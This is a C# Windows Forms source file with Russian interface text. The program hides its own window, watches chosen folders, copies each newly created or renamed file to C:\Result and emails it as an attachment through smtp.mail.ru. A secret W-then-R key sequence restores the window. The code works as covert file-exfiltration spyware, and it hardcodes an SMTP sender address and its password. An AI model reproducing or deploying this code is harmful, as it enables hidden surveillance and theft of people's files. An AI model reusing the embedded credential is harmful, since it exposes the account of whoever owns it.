using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.Mime;
using System.Security.AccessControl;
using System.Threading;
using System.Windows.Forms;

namespace FileSystemWatcher_WF
{
    public partial class Form1 : Form
    {
        FolderBrowserDialog fbd = new FolderBrowserDialog();
        List<string> list_folder_fisrt = new List<string>();
        List<string> list_folder = new List<string>();
        int ar = 0;
        List<FileSystemWatcher> list_fsw = new List<FileSystemWatcher>();
        FileSystemWatcher fsw;
        string str_txt = "";
        FileWriteClass fwc = new FileWriteClass();
        int count = 0;
        int flag = 0;
        string smtp= "smtp.mail.ru";
        string from_mail= "mchs@112pozh.ru";
        string pass_mail= "dqz-7sf-a9w-kcy@fgfftrhbegrt";
        string to_mail="";
        string header="";
        string message="";
        string att_file="";
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if(fbd.ShowDialog()==DialogResult.OK) 
            {
                if (list_folder_fisrt.Count == 0)
                {
                    list_folder_fisrt.Add(fbd.SelectedPath);
                    richTextBox1.Text += (string)(fbd.SelectedPath + "\r\n");
                }
                else
                {
                    flag = 0;
                    foreach (var item in list_folder_fisrt)
                    {
                        if (fbd.SelectedPath.Equals(item)) flag = 1; break;
                    }
                    if(flag == 0) 
                    {
                        list_folder_fisrt.Add(fbd.SelectedPath);
                        richTextBox1.Text += (string)(fbd.SelectedPath + "\r\n");
                    }
                    else { flag = 0; }
                }                 
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (textBox1.Text == "" || textBox1.Text == null) { MessageBox.Show("Вы не заполнили поле мыла!!!"); }
            else
            {
                to_mail = textBox1.Text;
                OffVisible();
                Thread th = new Thread(ThreadMethod);
                if (StartSettings()) { th.Start(); }
                else { MessageBox.Show("Вы не выбрали папки!!!"); OffVisible(); }
            }
        }

        private void OffVisible()
        {
            this.Visible = false; 
            button1.Visible = false;
            button2.Visible = false;
            richTextBox1.Visible = false;
            label1.Visible = false;
            textBox1.Visible = false;
        }

        private void ThreadMethod()
        {
            foreach (var item in list_folder_fisrt)
            {
                list_folder.Add(item.ToString());
                ReadDir(item.ToString());
            }
            foreach (var item in list_folder)
            {
                fsw = new FileSystemWatcher();                
                fsw.Path = item.ToString();
                SettingFSW();
                list_fsw.Add(fsw);
            }

            while(true)
            {

            }
        }

        private void SettingFSW()
        {
            //fsw.Filter = "*.*";
            fsw.NotifyFilter = NotifyFilters.LastAccess | NotifyFilters.LastWrite | NotifyFilters.FileName | NotifyFilters.DirectoryName;
            fsw.Created += OnCreated;
            fsw.Deleted += OnDeleted;
            fsw.Renamed += OnRenamed;
            try
            {
                fsw.EnableRaisingEvents = true;
            }
            catch(Exception ex) { }
        }

        private void OnRenamed(object sender, RenamedEventArgs e)
        {
            
            count++;
            str_txt = count + ") Папка: " + e.FullPath + "\r\n" + "Файл: " + e.OldName + " переименован в " + e.Name + " " + DateTime.Now + ".\r\n";
            fwc.OpenText();
            fwc.WriteText(str_txt);
            fwc.CloseText();
            
            int yp = 0;
        m1: { }
            try
            {
                
                File.Copy(e.FullPath, (string)(@"C:\Result\"+e.Name));
                
                str_txt = "Удалось сохранить\r\n";
                fwc.OpenText();
                fwc.WriteText(str_txt);
                fwc.CloseText();
                
                SendMail(smtp,from_mail,pass_mail, to_mail,"Файл переименован", (string)(e.OldFullPath+"\r\n"+e.FullPath.ToString()),e.FullPath.ToString());
                //SendMail("smtp.yandex.ru", "почта", "пароль", "получатель", "заголовок", "текст");
            }
            catch (Exception ex)
            {
                yp++; Thread.Sleep(50);
                if (yp != 10) { goto m1; }
                else
                {
                    str_txt = "Не удалось сохранить\r\n";
                    fwc.OpenText();
                    fwc.WriteText(str_txt);
                    fwc.CloseText();
                    SendMail(smtp, from_mail, pass_mail, to_mail, "Не получилось отправить файл", e.FullPath.ToString());
                }
            }
        }

        private void OnDeleted(object sender, FileSystemEventArgs e)
        {
            //count++;            
            str_txt = "Папка: " + e.FullPath + "\r\n" + "Файл: " + e.Name + " удален." + DateTime.Now +"\r\n";            
            fwc.OpenText();
            fwc.WriteText(str_txt);
            fwc.CloseText();
            SendMail(smtp, from_mail, pass_mail, to_mail, "Файл Удален", e.FullPath.ToString());
        }

        private void OnCreated(object sender, FileSystemEventArgs e)
        {
            count++;
            str_txt = count + ") Папка: " + e.FullPath + "\r\n" + "Файл: " + e.Name + " создан." + DateTime.Now + "\r\n";
            fwc.OpenText();
            fwc.WriteText(str_txt);
            fwc.CloseText();
            int yp = 0;
        m1: { }
            try
            {
                File.Copy(e.FullPath, (string)(@"C:\Result\" + count.ToString() + ".q"));
                str_txt = "Удалось сохранить\r\n";
                fwc.OpenText();
                fwc.WriteText(str_txt);
                fwc.CloseText();
                SendMail(smtp, from_mail, pass_mail, to_mail, "Файл создан", e.FullPath.ToString(), e.FullPath.ToString());
            }
            catch (Exception ex)
            {
                yp++; Thread.Sleep(50);
                if (yp != 10) { goto m1; }
                else
                {
                    str_txt = "Не удалось сохранить\r\n";
                    fwc.OpenText();
                    fwc.WriteText(str_txt);
                    fwc.CloseText();
                    SendMail(smtp, from_mail, pass_mail, to_mail, "Не получилось отправить файл", e.FullPath.ToString());
                }
            }
        }

        private void ReadDir(string path)
        {
            DirectoryInfo dir = new DirectoryInfo(path);
            foreach (var item in dir.GetDirectories())
            {
                DirectorySecurity ds = item.GetAccessControl();

                if (Directory.Exists(item.FullName))
                {
                    if (item.FullName.Equals(@"C:\Users\Administrator\Documents\My Music")) { ar = ar; }
                    list_folder.Add(item.FullName);
                }
            }
        }

        private bool StartSettings()
        {
            if (list_folder_fisrt.Count == 0) return false;
            return true;
        }

        private void Form1_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (ar == 0)
            {
                if (e.KeyChar == 'W' || e.KeyChar=='w')
                {
                    ar = 1;
                }
                else { ar = 0; }
            }
            else
            {
                if (e.KeyChar == 'R' || e.KeyChar == 'r')
                {
                    OnVisible();
                }
                else 
                {
                    ar = 0;
                }
            }
        }

        private void OnVisible()
        {
            richTextBox1.Visible = true;
            button1.Visible = true;
            button2.Visible = true;
            label1.Visible = true;
            textBox1.Visible = true;
            this.Visible = true;
        }

        public static void SendMail(string smtpServer, string from, string password,
                                        string mailto, string caption, string message, string attachFile = null)
        {
            try
            {
                MailMessage mail = new MailMessage();
                mail.From = new MailAddress(from);
                mail.To.Add(new MailAddress(mailto));
                mail.Subject = caption;
                mail.Body = message;
                if (!string.IsNullOrEmpty(attachFile))
                    mail.Attachments.Add(new Attachment(attachFile));
                SmtpClient client = new SmtpClient();
                client.Host = smtpServer;
                client.Port = 587;
                client.EnableSsl = true;
                client.Credentials = new NetworkCredential(from.Split('@')[0], password);
                client.DeliveryMethod = SmtpDeliveryMethod.Network;
                client.Send(mail);
                // client.Dispose();
                mail.Dispose();
            }
            catch (Exception e)
            {
                //throw new Exception("Mail.Send: " + e.Message);
            }
        }
    }
}
